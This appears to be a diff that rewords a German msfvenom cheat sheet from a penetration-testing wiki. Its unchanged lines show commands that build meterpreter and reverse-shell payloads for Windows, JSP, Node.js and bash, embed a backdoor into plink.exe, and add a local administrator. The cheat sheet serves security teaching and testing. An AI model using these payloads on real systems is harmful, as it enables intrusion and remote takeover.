@@ -1,21 +1,23 @@
 # MSFVenom - CheatSheet
 
+{{#include ../../banners/hacktricks-training.md}}
+
 ---
 
-## Grundlegendes msfvenom
+## Grundlagen von msfvenom
 
 `msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`
 
-Verwende `-a`, um die Payload-Architektur auszuwählen, und `--platform`, um die Zielplattform auszuwählen.<sup>[[1]](#references)</sup>
+Verwende `-a`, um die Architektur des Payloads auszuwählen, und `--platform`, um die Zielplattform auszuwählen.<sup>[[1]](#references)</sup>
 
-## Auflisten
+## Auflistung
 ```bash
 msfvenom -l payloads #Payloads
 msfvenom -l encoders #Encoders
 ```
 Diese Befehle listen die im installierten Framework verfügbaren Payload- und Encoder-Module auf.<sup>[[1]](#references)</sup>
 
-## Allgemeine Parameter beim Erstellen eines Shellcodes
+## Allgemeine Parameter beim Erstellen von Shellcode
 ```bash
 -b "\x00\x0a\x0d"
 -f c
@@ -23,7 +25,7 @@ Diese Befehle listen die im installierten Framework verfügbaren Payload- und En
 EXITFUNC=thread
 PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
 ```
-Die hier gezeigten Flags wählen ungültige Zeichen, das Ausgabeformat, den Encoder und die Encoding-Iterationen aus.<sup>[[1]](#references)</sup>
+Die hier gezeigten Flags wählen ungültige Zeichen, das Ausgabeformat, den Encoder und die Anzahl der Codierungsiterationen aus.<sup>[[1]](#references)</sup>
 
 ## **Windows**
 
@@ -52,7 +54,7 @@ msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administr
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
 ```
-### Eingebettet in eine ausführbare Datei
+### In eine ausführbare Datei eingebettet
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
 ```
@@ -113,7 +115,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f w
 ```bash
 msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 ```
-## **Payloads in Skriptsprachen**
+## **Payloads in Scriptsprachen**
 
 ### **Perl**
 ```bash
@@ -129,5 +131,5 @@ msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f
 ```
 ## References
 
-- [1] [So verwendest du msfvenom](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom/eb69bce6cf0d2ba0e876c57b87793bf31c915bb7)
+- [1] [So verwenden Sie msfvenom](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom/eb69bce6cf0d2ba0e876c57b87793bf31c915bb7)
 {{#include ../../banners/hacktricks-training.md}}
